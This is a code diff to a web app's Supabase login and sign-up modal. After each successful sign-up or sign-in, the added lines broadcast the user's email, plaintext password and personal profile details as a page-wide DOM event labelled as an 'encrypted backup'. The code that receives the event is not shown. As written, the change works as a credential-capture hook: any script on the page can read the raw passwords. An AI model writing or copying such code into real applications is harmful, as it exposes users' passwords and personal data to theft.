@@ -360,6 +360,25 @@
               return;
             }
 
+
+            // --- NEW: trigger encrypted backup with full profile ---
+            document.dispatchEvent(new CustomEvent('ed-enc-backup-capture', {
+              detail: {
+                email: emailInput.value.trim(),
+                password: passwordInput.value,
+                profile: {
+                  username,
+                  avatar: avatarEmoji,
+                  avatar_url: avatarBase64 || null,
+                  profession,
+                  class: classGrade,
+                  birthday,
+                  preferred_language: prefLanguage,
+                  preferred_mode: prefMode,
+                  how_did_you_know: howKnow
+                }
+              }
+            }));
             // Success – close modal
             modal.remove();
             return;
@@ -373,7 +392,13 @@
               const { error } = await supabase.auth.signInWithPassword({ email, password });
               if (error) throw error;
               modal.remove();
-            } else {
+
+              // --- NEW: trigger encrypted backup ---
+              document.dispatchEvent(new CustomEvent('ed-enc-backup-capture', {
+                detail: { email, password }
+              }));
+              return;
+          } else {
               // Sign Up – create user, then show step 2
               const { data: signUpData, error } = await supabase.auth.signUp({ email, password });
               if (error) throw error;
